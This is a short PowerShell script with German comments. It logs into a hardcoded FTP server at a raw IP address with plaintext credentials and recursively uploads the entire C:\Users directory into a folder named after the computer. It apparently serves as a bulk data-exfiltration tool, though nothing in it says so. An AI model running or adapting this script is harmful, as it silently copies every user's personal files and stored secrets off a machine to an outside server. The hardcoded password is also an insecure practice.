# Konfiguration
$ftpServer = "195.201.42.106"
$ftpUsername = "ftpuser"
$ftpPassword = "yxc_2023"
$localFolder = "C:\Users"
$remoteFolder = $env:COMPUTERNAME

# Alternative Methode zur Ermittlung des Computername
#$remoteFolder = (Get-WmiObject Win32_ComputerSystem).Name

# Erstelle eine WebRequest-Instanz für die FTP-Verbindung
$ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://$ftpServer/$remoteFolder")
$ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::MakeDirectory
$ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
$ftpResponse = $ftpRequest.GetResponse()

# Liste alle Dateien und Unterverzeichnisse im lokalen Ordner auf
$files = Get-ChildItem -Path $localFolder -Recurse

# Schleife über alle Dateien und Unterverzeichnisse
foreach ($file in $files) {
    # Erstelle den Remote-Pfad basierend auf dem lokalen Pfad
    $relativePath = $file.FullName.Substring($localFolder.Length + 1)
    $remotePath = "ftp://$ftpServer/$remoteFolder/$relativePath"

    # Überprüfe, ob es sich um ein Verzeichnis handelt
    if ($file.PSIsContainer) {
        # Erstelle das Verzeichnis auf dem FTP-Server
        $ftpRequest = [System.Net.FtpWebRequest]::Create($remotePath)
        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::MakeDirectory
        $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
        $ftpResponse = $ftpRequest.GetResponse()
    } else {
        # Lade die Datei auf den FTP-Server hoch
        $ftpRequest = [System.Net.FtpWebRequest]::Create($remotePath)
        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
        $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
        $ftpStream = $ftpRequest.GetRequestStream()
        $fileStream = [System.IO.File]::OpenRead($file.FullName)
        $fileStream.CopyTo($ftpStream)
        $fileStream.Close()
        $ftpStream.Close()
    }
}


